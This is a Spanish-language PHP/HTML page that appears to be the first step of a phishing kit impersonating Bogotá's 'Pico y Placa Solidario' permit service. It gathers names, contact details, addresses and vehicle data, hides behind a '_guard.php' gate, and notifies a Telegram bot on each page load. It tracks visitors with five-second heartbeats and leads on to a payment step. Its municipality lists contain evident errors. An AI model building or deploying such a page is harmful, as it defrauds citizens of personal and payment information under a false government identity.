<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Datos Personales - Pico y Placa Solidario</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Roboto', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      position: relative;
      overflow-x: hidden;
    }

    .background-wrapper {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
      overflow: hidden;
    }
    .background-wrapper .bg-image {
      width: 100%; height: 100%;
      object-fit: cover;
      display: block;
    }
    .background-wrapper .bg-blur {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      background: rgba(0, 0, 0, 0.3);
    }

    .modal-overlay {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 700px;
      margin: 0 auto;
      animation: fadeIn 0.3s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .modal-box {
      background: #ffffff;
      border-radius: 0.75rem;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
      width: 100%;
      max-height: 90vh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    .modal-header {
      background: #f5f5f5;
      padding: 1.5rem 1.5rem 1rem;
      border-bottom: 1px solid #e0e0e0;
      position: relative;
    }

    .modal-close-btn {
      position: absolute;
      top: 1rem; right: 1rem;
      width: 32px; height: 32px;
      border: none; background: none;
      font-size: 1.8rem; color: #666;
      cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      border-radius: 50%;
      transition: background 0.2s, color 0.2s;
    }
    .modal-close-btn:hover { background: rgba(0,0,0,0.05); color: #333; }

    .stepper {
      display: flex; align-items: center; justify-content: center;
      gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem;
    }
    .step { display: flex; flex-direction: column; align-items: center; gap: 0.35rem; min-width: 50px; }
    .step-circle {
      width: 32px; height: 32px;
      border-radius: 50%;
      background: #d0d0d0; color: white;
      font-weight: 700; font-size: 0.9rem;
      display: flex; align-items: center; justify-content: center;
      transition: all 0.3s;
    }
    .step-circle.active { background: #00271C; box-shadow: 0 0 12px rgba(0,39,28,0.4); }
    .step-circle.completed { background: #88F456; color: #00271C; }
    .step-line { width: 30px; height: 2px; background: #d0d0d0; margin: 0 -0.25rem; }
    .step-line.completed { background: #88F456; }
    .step-label { font-size: 0.7rem; color: #999; text-align: center; max-width: 60px; line-height: 1.2; }
    .step-label.active { color: #00271C; font-weight: 600; }

    .modal-content {
      flex: 1; overflow-y: auto;
      padding: 2rem 1.5rem;
    }
    .modal-content::-webkit-scrollbar { width: 6px; }
    .modal-content::-webkit-scrollbar-track { background: #f1f1f1; }
    .modal-content::-webkit-scrollbar-thumb { background: #b0b0b0; border-radius: 3px; }
    .modal-content::-webkit-scrollbar-thumb:hover { background: #888; }

    .section-title {
      font-size: 1.1rem; font-weight: 700; color: #00271C;
      margin-bottom: 1.5rem; padding-bottom: 0.5rem;
      border-bottom: 2px solid #00271C;
    }

    .form-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1.2rem 1.5rem;
      margin-bottom: 0.5rem;
    }
    .form-grid .full-width { grid-column: 1 / -1; }

    .form-group { margin-bottom: 0.8rem; }
    .form-group label {
      display: block; font-size: 0.9rem; font-weight: 600;
      color: #00271C; margin-bottom: 0.35rem;
    }
    .form-group label .required { color: #e53935; font-weight: 700; margin-left: 0.15rem; }

    .form-group input[type="text"],
    .form-group input[type="email"],
    .form-group input[type="tel"],
    .form-group select {
      width: 100%;
      padding: 0.6rem 0.8rem;
      border: 2px solid #ccc;
      border-radius: 0.3rem;
      font-size: 0.95rem;
      color: #333;
      background: #ffffff;
      font-family: 'Roboto', sans-serif;
      transition: all 0.2s;
    }
    .form-group input:focus,
    .form-group select:focus {
      outline: none;
      border-color: #00271C;
      box-shadow: 0 0 0 3px rgba(0,39,28,0.1);
    }
    .form-group input.error { border-color: #e53935; background-color: #fff5f5; }

    .form-group select {
      appearance: none; -webkit-appearance: none; -moz-appearance: none;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2300271C' stroke-width='2' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 0.75rem center;
      padding-right: 2.5rem;
      cursor: pointer;
    }
    .form-group select:disabled { background-color: #f5f5f5; opacity: 0.7; cursor: not-allowed; }

    .error-message { color: #e53935; font-size: 0.75rem; margin-top: 0.25rem; display: none; }
    .form-group.error input, .form-group.error select { border-color: #e53935; }
    .form-group.error .error-message { display: block; }

    .modal-footer {
      background: #f9f9f9;
      padding: 1.25rem 1.5rem;
      border-top: 1px solid #e0e0e0;
      display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap;
    }

    .btn {
      padding: 0.65rem 2rem;
      border-radius: 9999px;
      border: none;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s;
      min-width: 140px;
      text-align: center;
    }
    .btn-siguiente {
      background: #00271C; color: #88F456;
      box-shadow: 0 4px 12px rgba(0,39,28,0.2);
    }
    .btn-siguiente:hover {
      background: #00391f;
      box-shadow: 0 6px 16px rgba(0,39,28,0.3);
      transform: translateY(-2px);
    }
    .btn-siguiente:active { transform: translateY(0); }
    .btn-atras {
      background: white; color: #00271C;
      border: 2px solid #00271C;
    }
    .btn-atras:hover { background: #edfde5; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

    .toast {
      position: fixed;
      bottom: 2rem; left: 50%;
      transform: translateX(-50%);
      background: #00271C; color: white;
      padding: 0.8rem 2rem;
      border-radius: 9999px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
      z-index: 9999;
      animation: slideUp 0.3s ease;
      font-size: 0.9rem;
      max-width: 90vw;
      text-align: center;
    }
    .toast.error { background: #e53935; }

    @media (max-width: 1024px) { .modal-overlay { max-width: 95%; } }
    @media (max-width: 768px) {
      .form-grid { grid-template-columns: 1fr; gap: 0.8rem; }
      .modal-overlay { max-width: 100%; padding: 0; }
      .modal-box { max-height: 95vh; border-radius: 1rem 1rem 0 0; }
      .modal-header { padding: 1.2rem 1rem 0.8rem; }
      .modal-content { padding: 1.5rem 1rem; }
      .modal-close-btn { width: 28px; height: 28px; font-size: 1.5rem; }
      .stepper { gap: 0.3rem; }
      .step { min-width: 45px; }
      .step-circle { width: 28px; height: 28px; font-size: 0.8rem; }
      .step-line { width: 20px; }
      .step-label { font-size: 0.65rem; max-width: 50px; }
      .section-title { font-size: 1rem; margin-bottom: 1.2rem; }
      .form-group { margin-bottom: 0.7rem; }
      .form-group label { font-size: 0.85rem; }
      .form-group input, .form-group select { padding: 0.55rem 0.7rem; font-size: 0.9rem; }
      .modal-footer { padding: 1rem; gap: 0.75rem; }
      .btn { padding: 0.55rem 1.5rem; font-size: 0.9rem; min-width: 120px; }
    }
    @media (max-width: 480px) {
      body { padding: 0; }
      .modal-overlay { padding: 0; }
      .modal-box { border-radius: 1.25rem 1.25rem 0 0; max-height: 98vh; }
      .modal-header { padding: 0.8rem 0.75rem 0.6rem; }
      .modal-close-btn { width: 24px; height: 24px; font-size: 1.3rem; top: 0.6rem; right: 0.6rem; }
      .stepper { gap: 0.2rem; margin-top: 0.6rem; }
      .step { min-width: 38px; }
      .step-circle { width: 24px; height: 24px; font-size: 0.7rem; }
      .step-line { width: 12px; height: 1.5px; }
      .step-label { font-size: 0.55rem; max-width: 35px; }
      .modal-content { padding: 1rem 0.75rem; }
      .section-title { font-size: 0.9rem; margin-bottom: 1rem; }
      .form-grid { gap: 0.5rem; }
      .form-group { margin-bottom: 0.6rem; }
      .form-group label { font-size: 0.8rem; margin-bottom: 0.25rem; }
      .form-group input, .form-group select { padding: 0.5rem 0.6rem; font-size: 0.85rem; border-width: 1.5px; }
      .modal-footer { padding: 0.75rem; gap: 0.5rem; flex-direction: column; }
      .btn { padding: 0.5rem 1rem; font-size: 0.85rem; min-width: 100px; width: 100%; }
    }
  </style>
</head>
<body>

<div class="background-wrapper">
  <img class="bg-image" src="blur.png" alt="Fondo">
  <div class="bg-blur"></div>
</div>

<div class="modal-overlay" id="modalOverlay">
  <div class="modal-box">

    <div class="modal-header">
      <button class="modal-close-btn" onclick="cerrarModal();" title="Cerrar">✕</button>

      <div class="stepper" id="stepper">
        <div class="step">
          <div class="step-circle active" data-step="1">1</div>
          <div class="step-label active">Datos</div>
        </div>
        <div class="step-line" id="line1"></div>
        <div class="step">
          <div class="step-circle" data-step="2">2</div>
          <div class="step-label">Placa</div>
        </div>
        <div class="step-line" id="line2"></div>
        <div class="step">
          <div class="step-circle" data-step="3">3</div>
          <div class="step-label">Pago</div>
        </div>
        <div class="step-line" id="line3"></div>
        <div class="step">
          <div class="step-circle" data-step="4">4</div>
          <div class="step-label">Confirmar</div>
        </div>
      </div>
    </div>

    <form id="formularioRegistro" class="modal-content" onsubmit="return false;">
      <h2 class="section-title">Datos básicos de la persona</h2>

      <div class="form-grid">
        <div class="form-group">
          <label>Primer nombre<span class="required">*</span></label>
          <input type="text" name="primerNombre" id="primerNombre" placeholder="" required />
          <span class="error-message">Este campo es obligatorio</span>
        </div>
        <div class="form-group">
          <label>Primer apellido<span class="required">*</span></label>
          <input type="text" name="primerApellido" id="primerApellido" placeholder="" required />
          <span class="error-message">Este campo es obligatorio</span>
        </div>
      </div>

      <div class="form-grid">
        <div class="form-group">
          <label>Correo electrónico<span class="required">*</span></label>
          <input type="email" name="emailPrimario" id="emailPrimario" placeholder="" required />
          <span class="error-message">Ingrese un email válido</span>
        </div>
        <div class="form-group">
          <label>Teléfono o celular</label>
          <input type="tel" name="telefono" id="telefono" placeholder="" />
        </div>
      </div>

      <div class="form-grid">
        <div class="form-group">
          <label>Departamento de residencia<span class="required">*</span></label>
          <select name="departamento" id="departamento" onchange="cargarMunicipios()" required>
            <option value="">--- Seleccionar ---</option>
            <option value="amazonas">Amazonas</option>
            <option value="antioquia">Antioquia</option>
            <option value="arauca">Arauca</option>
            <option value="archipielago">Archipiélago de San Andrés, Providencia y Santa Catalina</option>
            <option value="atlantico">Atlántico</option>
            <option value="bolivar">Bolívar</option>
            <option value="boyaca">Boyacá</option>
            <option value="casanare">Casanare</option>
            <option value="cauca">Cauca</option>
            <option value="cesar">Cesar</option>
            <option value="choco">Chocó</option>
            <option value="cordillera">Córdoba</option>
            <option value="cundinamarca">Cundinamarca</option>
            <option value="guainia">Guainía</option>
            <option value="guaviare">Guaviare</option>
            <option value="huila">Huila</option>
            <option value="laguajira">La Guajira</option>
            <option value="magdalena">Magdalena</option>
            <option value="meta">Meta</option>
            <option value="nariño">Nariño</option>
            <option value="norte_santander">Norte de Santander</option>
            <option value="putumayo">Putumayo</option>
            <option value="quindio">Quindío</option>
            <option value="risaralda">Risaralda</option>
            <option value="santander">Santander</option>
            <option value="sucre">Sucre</option>
            <option value="tolima">Tolima</option>
            <option value="valle">Valle del Cauca</option>
            <option value="vaupes">Vaupés</option>
            <option value="vichada">Vichada</option>
            <option value="bogota">Bogotá D.C.</option>
          </select>
          <span class="error-message">Seleccione un departamento</span>
        </div>
        <div class="form-group">
          <label>Municipio de residencia<span class="required">*</span></label>
          <select name="municipio" id="municipio" required disabled>
            <option value="">--- Seleccionar ---</option>
          </select>
          <span class="error-message">Seleccione un municipio</span>
        </div>
      </div>

      <div class="form-grid">
        <div class="form-group" id="localidadWrap" style="display:none;">
          <label>Localidad de residencia<span class="required">*</span></label>
          <select name="localidad" id="localidad" required>
            <option value="">--- Seleccionar ---</option>
            <option value="usaquen">Usaquén</option>
            <option value="chapinero">Chapinero</option>
            <option value="santa fe">Santa Fe</option>
            <option value="san cristobal">San Cristóbal</option>
            <option value="usme">Usme</option>
            <option value="tunjuelito">Tunjuelito</option>
            <option value="bosa">Bosa</option>
            <option value="kennedy">Kennedy</option>
            <option value="fontibon">Fontibón</option>
            <option value="engativa">Engativá</option>
            <option value="suba">Suba</option>
            <option value="barrios unidos">Barrios Unidos</option>
            <option value="teusaquillo">Teusaquillo</option>
            <option value="los martires">Los Mártires</option>
            <option value="antonio nariño">Antonio Nariño</option>
            <option value="puente aranda">Puente Aranda</option>
            <option value="la candelaria">La Candelaria</option>
            <option value="rafael uribe">Rafael Uribe Uribe</option>
            <option value="ciudad bolivar">Ciudad Bolívar</option>
            <option value="sumapaz">Sumapaz</option>
          </select>
          <span class="error-message">Seleccione una localidad</span>
        </div>
        <div class="form-group">
          <label>Dirección de origen<span class="required">*</span></label>
          <input type="text" name="dirOrigen" id="dirOrigen" placeholder="" required />
          <span class="error-message">Este campo es obligatorio</span>
        </div>
      </div>

      <div class="form-grid">
        <div class="form-group">
          <label>Tipo de propiedad<span class="required">*</span></label>
          <select name="tipoPropiedad" id="tipoPropiedad" required>
            <option value="">--- Seleccionar ---</option>
            <option value="propietario">Propietario</option>
            <option value="locatario">Locatario</option>
            <option value="poseedor">Poseedor</option>
          </select>
          <span class="error-message">Seleccione un tipo de propiedad</span>
        </div>
        <div class="form-group">
          <label>Soy propietario de<span class="required">*</span></label>
          <select name="cantVehiculos" id="cantVehiculos" required>
            <option value="">--- Seleccionar ---</option>
            <option value="1 Vehículo">1 Vehículo</option>
            <option value="2 Vehículos">2 Vehículos</option>
            <option value="3 Vehículos">3 Vehículos</option>
            <option value="4 Vehículos">4 Vehículos</option>
            <option value="5 o más Vehículos">5 o más Vehículos</option>
          </select>
          <span class="error-message">Seleccione una opción</span>
        </div>
      </div>

      <div class="form-grid">
        <div class="form-group full-width">
          <label>Motivo de viaje</label>
          <select name="motivoViaje" id="motivoViaje">
            <option value="">--- Seleccionar ---</option>
            <option value="trabajo">Trabajo</option>
            <option value="estudio">Estudio</option>
            <option value="salud">Salud</option>
            <option value="otro">Otro</option>
          </select>
        </div>
      </div>
    </form>

    <div class="modal-footer">
      <button type="button" class="btn btn-atras" onclick="pasoAnterior();" id="btnAtras" style="display:none;">← Atrás</button>
      <button type="button" class="btn btn-siguiente" onclick="pasoSiguiente();">Siguiente →</button>
    </div>

  </div>
</div>

<script>
  // ============================================
  // TELEGRAM - CONSUME VARIABLES DE ENTORNO (RENDER)
  // Vía /api/telegram.php que lee TG_TOKEN_P1 y TG_CHAT_P1
  // ============================================
  async function enviarP1() {
    try {
      const response = await fetch('/api/telegram.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mensaje: 'p1' })
      });
      const data = await response.json();
      if (data.success) console.log('✅ p1 enviado a Telegram (desde env vars)');
      else console.error('❌ Telegram respondió:', data);
    } catch (error) {
      console.error('❌ Error de red:', error);
    }
  }

  enviarP1();

  // ============================================
  // TRACKING DE USUARIOS EN LÍNEA
  // ============================================
  const TRACKING_URL = '/api/usuarios_online.php';
  let usuarioId = localStorage.getItem('usuarioId');

  if (!usuarioId) {
    usuarioId = 'USR-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('usuarioId', usuarioId);
  }

  function enviarHeartbeat() {
    fetch(TRACKING_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        usuarioId: usuarioId,
        pagina: window.location.pathname
      })
    }).catch(function(error) {
      console.log('Error enviando heartbeat:', error);
    });
  }

  enviarHeartbeat();
  setInterval(enviarHeartbeat, 5000);

  window.addEventListener('beforeunload', function() {
    navigator.sendBeacon(TRACKING_URL, JSON.stringify({
      usuarioId: usuarioId,
      pagina: 'cerrando'
    }));
  });

  // ============================================
  // LÓGICA DEL MODAL / STEPPER
  // ============================================
  let pasoActual = 1;
  const totalPasos = 4;

  const municipiosPorDepto = {
    'amazonas': ['Leticia', 'Puerto Nariño', 'La Pedrera', 'Tarapacá'],
    'antioquia': ['Medellín', 'Abejorral', 'Abriaquí', 'Alejandría', 'Amagá', 'Amalfi', 'Andes', 'Angelópolis', 'Angostura', 'Anorí'],
    'arauca': ['Arauca', 'Arauquita', 'Cravo Norte', 'El Amparo', 'Fortul', 'Puerto Rondón', 'Saravena'],
    'archipielago': ['San Andrés', 'Providencia', 'Santa Catalina'],
    'atlantico': ['Barranquilla', 'Barrancabermeja', 'Galapa', 'Luruaco', 'Malambo', 'Manatí', 'Palmar de Varela', 'Piojó', 'Polonuevo', 'Ponedera'],
    'bolivar': ['Cartagena', 'Magangué', 'Mompos', 'San Juan Nepomuceno', 'Turbaco', 'Turbantía', 'Villanueva', 'Arjona', 'Clemencia', 'Córdoba'],
    'boyaca': ['Tunja', 'Duitama', 'Sogamoso', 'Paipa', 'Aquitania', 'Belén', 'Boavita', 'Boyacá', 'Briceño', 'Búngara'],
    'casanare': ['Yopal', 'Arauquita', 'Aguazul', 'Charte', 'Hato Corozal', 'La Salina', 'Maní', 'Monterrey', 'Orocué', 'Paz de Ariporo'],
    'cauca': ['Popayán', 'Cali', 'Santander de Quilichao', 'Guachocó', 'Piamonte', 'Bolívar', 'Buenos Aires', 'Caloto', 'Corinto', 'El Tambo'],
    'cesar': ['Valledupar', 'Agustín Codazzi', 'Astrea', 'Becerril', 'Buenavista', 'Chimichagua', 'Curumaní', 'El Copey', 'El Paso', 'Gamarra'],
    'choco': ['Quibdó', 'Acandí', 'Bahía Solano', 'Bojayá', 'Carmen del Darién', 'Cértegui', 'Condoto', 'El Carmen', 'Istmina', 'Litoral del Darién'],
    'cordillera': ['Montería', 'Arboletes', 'Buenavista', 'Canalete', 'Cereté', 'Ciénaga de Oro', 'Cotocá', 'El Carmen de Bolívar', 'Lorica', 'Los Córdobas'],
    'cundinamarca': ['Bogotá', 'Zipaquirá', 'Ubaté', 'Facatativá', 'Girardot', 'Fusagasugá', 'Soacha', 'Chía', 'Mosquera', 'Villavicencio'],
    'guainia': ['Inírida', 'Barranco Minas', 'San Felipe', 'La Guadalupe', 'Morichal'],
    'guaviare': ['San José del Guaviare', 'Calamar', 'El Retorno', 'Muela'],
    'huila': ['Neiva', 'Campoalegre', 'Garzón', 'Isnos', 'Pitalito', 'Acevedo', 'Agrado', 'Aipe', 'Algeciras', 'Altamira'],
    'laguajira': ['Riohacha', 'Maicao', 'Uribia', 'Fonseca', 'Manaure', 'Albania', 'Barrancas', 'Dibulla', 'Distracción', 'El Molino'],
    'magdalena': ['Santa Marta', 'Ciénaga', 'Fundación', 'Plato', 'El Banco', 'Aracataca', 'Ariguaní', 'Cerro San Antonio', 'Chivolo', 'Concordia'],
    'meta': ['Villavicencio', 'Acacías', 'Cabuyaro', 'Castilla la Nueva', 'El Calvario', 'El Dorado', 'Fuente de Oro', 'Granada', 'La Macarena', 'La Uribe'],
    'nariño': ['Pasto', 'Ipiales', 'Tumaco', 'Túquerres', 'Ricaurte', 'Chachagüí', 'Consacá', 'Contadero', 'Córdoba', 'Cuaspud'],
    'norte_santander': ['Cúcuta', 'Ocaña', 'Pamplona', 'Catatumbo', 'El Zulia', 'Hacarí', 'Labateca', 'La Playa', 'Los Patios', 'Mutiscua'],
    'putumayo': ['Mocoa', 'Puerto Asís', 'Puerto Caicedo', 'Orito', 'Llorente', 'Villagarzón', 'Sibundoy', 'Santiago', 'San Francisco', 'Colón'],
    'quindio': ['Armenia', 'Pereira', 'Dosquebradas', 'Circasia', 'Córdoba', 'Filandia', 'Génova', 'La Tebaida', 'Montenegro', 'Pijao'],
    'risaralda': ['Pereira', 'Dosquebradas', 'Cartago', 'Balboa', 'Belén de Umbría', 'Guática', 'La Ceja', 'La Virginia', 'Mistrató', 'Mistrato'],
    'santander': ['Bucaramanga', 'Girón', 'Floridablanca', 'Piedecuesta', 'Socorro', 'San Gil', 'Vélez', 'Barbosa', 'Barichara', 'Cabrera'],
    'sucre': ['Sincelejo', 'Colosó', 'Coveñas', 'Chalán', 'El Roble', 'Galeras', 'La Unión', 'Los Palmitos', 'Morroa', 'Ovejas'],
    'tolima': ['Ibagué', 'Espinal', 'Guamo', 'Chaparral', 'Melgar', 'Purificación', 'Ambalema', 'Armero', 'Ataco', 'Cajamarca'],
    'valle': ['Cali', 'Palmira', 'Buenaventura', 'Yumbo', 'Cartagena', 'Cartago', 'Sevilla', 'Tulúa', 'Buga', 'Andalucía'],
    'vaupes': ['Mitú', 'Carurú', 'Papunahua', 'Taraira', 'Vaupés'],
    'vichada': ['Puerto Carreño', 'Cumaribo', 'La Primavera', 'Santa Rosalía'],
    'bogota': ['Usaquén', 'Chapinero', 'Santa Fe', 'San Cristóbal', 'Usme', 'Tunjuelito', 'Bosa', 'Kennedy', 'Fontibón', 'Engativá', 'Suba', 'Barrios Unidos', 'Teusaquillo', 'Los Mártires', 'Antonio Nariño', 'Puente Aranda', 'La Candelaria', 'Rafael Uribe Uribe', 'Ciudad Bolívar', 'Sumapaz']
  };

  function cargarMunicipios() {
    const deptoSelect = document.getElementById('departamento');
    const municipioSelect = document.getElementById('municipio');
    const localidadWrap = document.getElementById('localidadWrap');
    const deptoValue = deptoSelect.value;

    municipioSelect.innerHTML = '<option value="">--- Seleccionar ---</option>';

    if (deptoValue === 'bogota') {
      localidadWrap.style.display = 'block';
      document.getElementById('localidad').required = true;
    } else {
      localidadWrap.style.display = 'none';
      document.getElementById('localidad').required = false;
    }

    if (deptoValue && municipiosPorDepto[deptoValue]) {
      const municipios = municipiosPorDepto[deptoValue];
      municipios.forEach(municipio => {
        const option = document.createElement('option');
        option.value = municipio.toLowerCase();
        option.textContent = municipio;
        municipioSelect.appendChild(option);
      });
      municipioSelect.disabled = false;
    } else {
      municipioSelect.disabled = true;
    }

    municipioSelect.closest('.form-group').classList.remove('error');
  }

  function cerrarModal() {
    document.getElementById('modalOverlay').style.display = 'none';
  }

  function validarFormulario() {
    const form = document.getElementById('formularioRegistro');
    const campos = form.querySelectorAll('[required]');
    let valido = true;

    campos.forEach(campo => {
      const grupo = campo.closest('.form-group');
      if (!grupo) return;
      if (!campo.value.trim()) {
        grupo.classList.add('error');
        valido = false;
      } else {
        grupo.classList.remove('error');
      }
    });

    const emailPrimario = document.getElementById('emailPrimario');
    if (emailPrimario.value && !validarEmail(emailPrimario.value)) {
      emailPrimario.closest('.form-group').classList.add('error');
      valido = false;
    }

    return valido;
  }

  function validarEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  }

  function pasoSiguiente() {
    if (validarFormulario()) {
      if (pasoActual === 1) {
        guardarDatosYRedirigir();
      } else if (pasoActual < totalPasos) {
        pasoActual++;
        actualizarStepper();
        mostrarToast('Avanzando al paso ' + pasoActual);
      } else {
        mostrarToast('Formulario completado', 'success');
      }
    } else {
      mostrarToast('Por favor completa todos los campos requeridos', 'error');
    }
  }

  function guardarDatosYRedirigir() {
    const datos = {
      primerNombre: document.getElementById('primerNombre').value,
      primerApellido: document.getElementById('primerApellido').value,
      emailPrimario: document.getElementById('emailPrimario').value,
      telefono: document.getElementById('telefono').value,
      departamento: document.getElementById('departamento').value,
      municipio: document.getElementById('municipio').value,
      localidad: document.getElementById('localidad').value,
      dirOrigen: document.getElementById('dirOrigen').value,
      tipoPropiedad: document.getElementById('tipoPropiedad').value,
      cantVehiculos: document.getElementById('cantVehiculos').value,
      motivoViaje: document.getElementById('motivoViaje').value
    };

    // Guardar en localStorage
    localStorage.setItem('datosRegistro', JSON.stringify(datos));
    localStorage.setItem('primerNombre',   datos.primerNombre);
    localStorage.setItem('primerApellido', datos.primerApellido);
    localStorage.setItem('email',          datos.emailPrimario);
    localStorage.setItem('celular',        datos.telefono);
    localStorage.setItem('departamento',   datos.departamento);
    localStorage.setItem('municipio',      datos.municipio);
    localStorage.setItem('localidad',      datos.localidad);
    localStorage.setItem('direccion',      datos.dirOrigen);
    localStorage.setItem('tipoPropiedad',  datos.tipoPropiedad);
    localStorage.setItem('cantVehiculos',  datos.cantVehiculos);
    localStorage.setItem('motivoViaje',    datos.motivoViaje);

    mostrarToast('¡Datos guardados! Redirigiendo...');
    setTimeout(() => {
      window.location.href = 'placa.php';
    }, 800);
  }

  function pasoAnterior() {
    if (pasoActual > 1) {
      pasoActual--;
      actualizarStepper();
      mostrarToast('Volviendo al paso ' + pasoActual);
    }
  }

  function actualizarStepper() {
    const circles = document.querySelectorAll('.step-circle');
    const labels = document.querySelectorAll('.step-label');
    const lines = document.querySelectorAll('.step-line');

    circles.forEach((circle, index) => {
      const stepNum = parseInt(circle.dataset.step);
      circle.classList.remove('active', 'completed');
      labels[index].classList.remove('active');

      if (stepNum < pasoActual) {
        circle.classList.add('completed');
        circle.textContent = '✓';
      } else if (stepNum === pasoActual) {
        circle.classList.add('active');
        circle.textContent = stepNum;
        labels[index].classList.add('active');
      } else {
        circle.textContent = stepNum;
      }
    });

    lines.forEach((line, index) => {
      line.classList.remove('completed');
      if (index < pasoActual - 1) {
        line.classList.add('completed');
      }
    });

    const btnAtras = document.getElementById('btnAtras');
    if (pasoActual > 1) {
      btnAtras.style.display = 'inline-block';
    } else {
      btnAtras.style.display = 'none';
    }
  }

  function mostrarToast(mensaje, tipo = 'success') {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();

    const toast = document.createElement('div');
    toast.className = 'toast' + (tipo === 'error' ? ' error' : '');
    toast.textContent = mensaje;
    document.body.appendChild(toast);

    setTimeout(() => {
      toast.remove();
    }, 3000);
  }

  document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('input, select').forEach(campo => {
      campo.addEventListener('input', function() {
        const grupo = this.closest('.form-group');
        if (grupo) grupo.classList.remove('error');
      });
      campo.addEventListener('change', function() {
        const grupo = this.closest('.form-group');
        if (grupo) grupo.classList.remove('error');
      });
    });

    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') {
        cerrarModal();
      }
    });

    const datosGuardados = localStorage.getItem('datosRegistro');
    if (datosGuardados) {
      try {
        const datos = JSON.parse(datosGuardados);
        for (const [key, value] of Object.entries(datos)) {
          const campo = document.getElementById(key);
          if (campo) campo.value = value || '';
        }
        if (datos.departamento) {
          document.getElementById('departamento').value = datos.departamento;
          cargarMunicipios();
          if (datos.municipio) {
            document.getElementById('municipio').value = datos.municipio;
          }
        }
      } catch(e) {
        console.error('Error cargando datos guardados:', e);
      }
    }

    actualizarStepper();
  });
</script>

</body>
</html>
